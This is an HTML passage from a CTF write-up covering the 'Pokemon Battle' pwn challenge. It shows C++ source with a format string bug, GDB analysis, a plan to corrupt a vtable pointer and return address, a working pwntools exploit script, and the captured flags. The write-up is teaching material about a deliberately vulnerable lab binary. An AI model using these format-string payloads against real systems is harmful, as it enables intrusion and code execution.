</div><h4 id="result-2">Result <a href="#result-2" class="anchor">#</a></h4>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/jVQtPqg.png" alt=""  />
</p></p>
<blockquote>
<p>Flag: <code>SEE{W3lc0mE_t0_th3_H4lL_0f_F4ME_0de280c6adb0f3da9f7ee5bd2057f8354969920c}</code></p>
</blockquote>
<h2 id="pokemon-battle">Pokemon Battle <a href="#pokemon-battle" class="anchor">#</a></h2>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Author: Neobeo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Gary wants to challenge you to a virtual battle. Be sure to choose your pokemon well! Here&#39;s an early leak of the game, but you should know that it&#39;s incomplete and there&#39;s currently no way to win.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc fun.chall.seetf.sg 50005
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="initial-analysis-2">Initial Analysis <a href="#initial-analysis-2" class="anchor">#</a></h3>
<p>We were given a binary file and the source code. Let&rsquo;s check the source code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// g++ pokemonbattle.cpp -w -o pokemonbattle
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#099">#include</span> <span style="color:#099">&lt;iostream&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#078;font-weight:bold">char</span> pokemon[<span style="color:#f60">13</span>]; <span style="color:#09f;font-style:italic">// longest pokemon name is 12 letters (Crabominable)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#069;font-weight:bold">virtual</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">Battle</span>() {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;Let the battle begin...</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">// @todo: implement an actual battle
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        printf(<span style="color:#c30">&#34;Your pokemon was defeated. You blacked out!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">virtual</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">Play</span>() {
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;Choose a pokemon: &#34;</span>);
</span></span><span style="display:flex;"><span>        std<span style="color:#555">::</span>cin.getline(pokemon, <span style="color:#069;font-weight:bold">sizeof</span> pokemon);
</span></span><span style="display:flex;"><span>        printf(pokemon);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;, I choose you!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>        Battle();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} battler;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>() {
</span></span><span style="display:flex;"><span>    battler.Play();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">win</span>() {
</span></span><span style="display:flex;"><span>    system(<span style="color:#c30">&#34;cat flag.txt&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so there is <code>win</code> function which we could use. Also notice that there is a format string bug in the <code>Play()</code> method, but the payload length limit is very small, which is 12.</p>
<p>I use GDB to have better understanding on how the binary works, and maybe found a way to send longer payload than 12, because 12 is not enough. So, first we try to set a breakpoint and inspect the GDB stack.
<p class="markdown-image">
  <img src="https://i.imgur.com/f5kOVdg.png" alt=""  />
</p></p>
<p>I try to check the address inside <code>0x00555555558150</code>, and below is the result
<p class="markdown-image">
  <img src="https://i.imgur.com/KhoXu8q.png" alt=""  />
</p></p>
<p>Okay, so turn out, it is the <code>battler</code> object, which stored a pointer which point to the array of its internal method address pointer, and also the <code>pokemon</code> variable.</p>
<p>After trying the format string payload several times, we found:</p>
<ul>
<li><code>%7$p</code> will point to <code>$rbp-8</code>, which contains <code>0x00555555558150</code>.
<ul>
<li>If you are confused why the stack leak is in 7th parameter. Basically, in x64, if you call a function, the 6th first param will be passed via register (consecutively rdi, rsi, rdx, rcx, r8 r9), and the rest will be fetched from the stack. So, 1st is rsi, 2nd is rdx, 3rd is rcx, 4th is r8, 5th is r9, 6th is [rsp], and 7th is [rsp+8] or [rbp-8], which is the address that we got here.</li>
</ul>
</li>
<li><code>%8$p</code> will point to <code>$rbp</code>, which contain saved <code>rbp</code> value of the previous call stack, which is null, so we can&rsquo;t do much on this value.</li>
</ul>
<h3 id="exploitation-plan-2">Exploitation Plan <a href="#exploitation-plan-2" class="anchor">#</a></h3>
<p>Based on info that we gather before, we know that we can get the value inside <code>0x00555555558150</code>, which contains <code>0x0000555555557d68</code>, pointer to the <code>Battle()</code> method.</p>
<p>What if we increase the last byte by 8 by overwriting the last byte to <code>0x70</code> with payload <code>%112c%7$hhn</code>? If you don&rsquo;t understand the payload, it means &ldquo;overwrite the last byte of the value pointed by the 7-th param (which is the <code>battler</code> pointer to its array of pointers of the internal methods), with the total characters those have been printed (which is 112, <code>%112c</code> means print 112 whitespace)&rdquo;.</p>
<p>That means, when the <code>battler</code> struct want to call <code>Battle()</code>, instead of calling <code>Battle()</code>, it will call the address that was pointed by  <code>0x0000555555557d68+8</code>, which is the <code>Play()</code> method. With this, the <code>Play()</code> method will recursively call the method itself, and basically, we have infinite loop and we can split our format string payload to multiple step.</p>
<p>Let&rsquo;s try to do that, and inspect in the GDB on what the result is.
<p class="markdown-image">
  <img src="https://i.imgur.com/OOYBc3z.png" alt=""  />
</p></p>
<p>As you can see, our stack got shifted by <code>0x20</code>, and as you can see, the <code>rbp</code> value points to the previous call stack <code>rbp</code>, which is not null anymore, and it contains our stack address.</p>
<p>To recap, now our call stack is
main -&gt; Play() -&gt; Play(). Another thing is, if during the second call of Play() we input the format string:</p>
<ul>
<li><code>%8$p</code>, it refers to the second call <code>rbp</code> address, which contains value of the first call <code>rbp</code>.</li>
<li><code>%12$p</code>, it refers to the first call <code>rbp</code> address, which is null.</li>
</ul>
<p>Now, imagine that we continue the binary again, now our call stack will be main -&gt; Play() -&gt; Play() -&gt; Play(), which mean if we input:</p>
<ul>
<li><code>%8$p</code>, it refers to the third call <code>rbp</code> address, which contains value of the second call <code>rbp</code>.</li>
<li><code>%12$p</code>, it refers to the second call <code>rbp</code> address, which contains value of the first call <code>rbp</code>, which is not nil.</li>
</ul>
<p>So, after the third call, we now have a stack address (A) which contains pointer to a stack address (B), where B contains a stack address ( C ). Not only that, we also have a pointer that points to (B). With the format string bug, we can overwrite the value of B to point to our desired stack address (D). And after that, when we go to the fourth call, we can get what B points to (D), and with the format string bug, overwrite the value of (D) to our desired value. To give illustration, see below:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>On the third call, we can use format string,
</span></span><span style="display:flex;"><span>to get the 3rd-RBP value (which is 2nd-RBP),
</span></span><span style="display:flex;"><span>and overwrite what its point (which currently
</span></span><span style="display:flex;"><span>contains 1st-RBP, but soon will be overwritten
</span></span><span style="display:flex;"><span>to target)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Third call stack
</span></span><span style="display:flex;"><span>        Before
</span></span><span style="display:flex;"><span>        Overwrite      After Overwrite
</span></span><span style="display:flex;"><span>        2nd-RBP        via Format String
</span></span><span style="display:flex;"><span>3rd-RBP | 2nd-RBP  |    | 2nd-RBP  |
</span></span><span style="display:flex;"><span>target  | xxxxxxxx |    | xxxxxxxx |
</span></span><span style="display:flex;"><span>        |   ...    | -&gt; |   ...    |
</span></span><span style="display:flex;"><span>        |   ...    |    |   ...    |
</span></span><span style="display:flex;"><span>2nd-RBP | 1st-RBP  |    |  target  | &lt;- Now it points to target instead of 1st-RBP
</span></span><span style="display:flex;"><span>------------------------------------------------------
</span></span><span style="display:flex;"><span>On the fourth call, we can use format string,
</span></span><span style="display:flex;"><span>to get the 2nd-RBP value (which is now target),
</span></span><span style="display:flex;"><span>and overwrite what its point (which currently
</span></span><span style="display:flex;"><span>contains xxxxxxxx, but soon will be overwritten
</span></span><span style="display:flex;"><span>to xxxxxxxy).
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Fourth call stack
</span></span><span style="display:flex;"><span>        Before
</span></span><span style="display:flex;"><span>        Overwrite      After Overwrite
</span></span><span style="display:flex;"><span>        target         via Format String
</span></span><span style="display:flex;"><span>4th-RBP | 3rd-RBP  |    | 3rd-RBP  |
</span></span><span style="display:flex;"><span>        |   ...    |    |   ...    |
</span></span><span style="display:flex;"><span>        |   ...    |    |   ...    |
</span></span><span style="display:flex;"><span>        |   ...    |    |   ...    |
</span></span><span style="display:flex;"><span>3rd-RBP | 2nd-RBP  |    | 2nd-RBP  |
</span></span><span style="display:flex;"><span>target  | xxxxxxxx |    | xxxxxxxy |
</span></span><span style="display:flex;"><span>        |   ...    | -&gt; |   ...    |
</span></span><span style="display:flex;"><span>        |   ...    |    |   ...    |
</span></span><span style="display:flex;"><span>2nd-RBP | 1st-RBP  |    |  target  |
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on the above illustration, our plan is:</p>
<ul>
<li>On the first call, we will overwrite the <code>battler</code> struct value which contains the address that points to the array of the internal method pointers. We will shift it by 8 (overwrite the last byte from <code>0x68</code> to <code>0x70</code>). After this, when <code>battler</code> call <code>Battle()</code>, it will call <code>Play()</code> instead, which resulted in infinite recursive of <code>Play()</code> calls.</li>
<li>On the second call, we will leak the <code>rbp</code> address of the first call via <code>%8$p</code>.</li>
<li>On the third call, we will overwrite the second <code>rbp</code> value to <code>leak-0x20-0x20-0x20+8</code>, which is the calculated address of the return address of the fourth call.</li>
<li>On the fourth call, we will get the second <code>rbp</code> value (which now points to the fourth call return address), and overwrite its return address with the <code>win</code> function.</li>
<li>On the fifth call, we will overwrite the <code>battler</code> value of the address to the array of internal method back to the beginning (overwrite the last byte from <code>0x70</code> to <code>0x68</code>).</li>
<li>After that, it will continue to the fourth call address, and then when the fourth call finished, it will return to win function instead of to the third call.</li>
</ul>
<h3 id="solution-3">Solution <a href="#solution-3" class="anchor">#</a></h3>
<p>Notes that to implement our plan, we need to make sure that the last byte of the first leaked <code>rbp</code> is larger than <code>0x60</code>, so that the second lsb won&rsquo;t changed after we subtract it with <code>0x60</code>. So, what we do is just re-connect to the server until the leaked <code>rbp</code> is &gt; <code>0x60</code>.</p>
<p>Below is our full script to implement the plan</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">while</span> <span style="color:#069;font-weight:bold">True</span>:
</span></span><span style="display:flex;"><span>    r <span style="color:#555">=</span> remote(<span style="color:#c30">&#39;fun.chall.seetf.sg&#39;</span>, <span style="color:#f60">50005</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;pokemon: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#a00">%112c</span><span style="color:#c30">%7$hhn&#39;</span>) <span style="color:#09f;font-style:italic"># Overwrite battler stored pointer, so that Battle() will be redirected to Play()</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;pokemon: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;%8$p&#39;</span>) <span style="color:#09f;font-style:italic"># Leak the stack address (precisely, the first RBP address)</span>
</span></span><span style="display:flex;"><span>    out <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>    leak <span style="color:#555">=</span> <span style="color:#366">int</span>(out<span style="color:#555">.</span>split(<span style="color:#c30">b</span><span style="color:#c30">&#39;,&#39;</span>)[<span style="color:#f60">0</span>][<span style="color:#555">-</span><span style="color:#f60">2</span>:], <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> leak <span style="color:#555">&gt;</span> <span style="color:#f60">0x60</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span>target <span style="color:#555">=</span> leak<span style="color:#555">-</span><span style="color:#f60">0x20</span><span style="color:#555">-</span><span style="color:#f60">0x20</span><span style="color:#555">-</span><span style="color:#f60">0x20</span><span style="color:#555">+</span><span style="color:#f60">8</span> <span style="color:#09f;font-style:italic"># Our target is the (future) fourth RBP + 8 (fourth call saved return address)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span>target<span style="color:#a00">}</span><span style="color:#c30">c%8$hhn&#39;</span><span style="color:#555">.</span>encode() <span style="color:#09f;font-style:italic"># Third call, we overwrite the 2nd-RBP value from first RBP to (future) fourth RBP + 8</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;pokemon: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0xc6</span><span style="color:#a00">}</span><span style="color:#c30">c%16$hhn&#39;</span><span style="color:#555">.</span>encode() <span style="color:#09f;font-style:italic"># Fourth call, we get the 2nd-RBP (which is now points to fourth saved return address), and overwrite its last byte, so that it points to win()</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;pokemon: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#a00">%104c</span><span style="color:#c30">%7$hhn&#39;</span> <span style="color:#09f;font-style:italic"># Fifth call, fix the battler stored pointer, so that Battle() will call the real Battle()</span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;pokemon: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>flag <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>) <span style="color:#09f;font-style:italic"># The fifth call will continue to fourth call, and the fourth call will return to win() instead to the third call</span>
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Flag: </span><span style="color:#a00">{</span>flag<span style="color:#555">.</span>decode()<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="result-3">Result <a href="#result-3" class="anchor">#</a></h4>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/0pfY82c.png" alt=""  />
</p></p>
<blockquote>
<p>Flag: <code>SEE{did_you_choose_missingno_b6d3c6594dcc332c7e22d231d10b8b8b}</code></p>
</blockquote>
<h1 id="crypto">Crypto <a href="#crypto" class="anchor">#</a></h1>
<p>We managed to solve two challs on this category</p>
<h2 id="lost-modulus">Lost Modulus <a href="#lost-modulus" class="anchor">#</a></h2>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
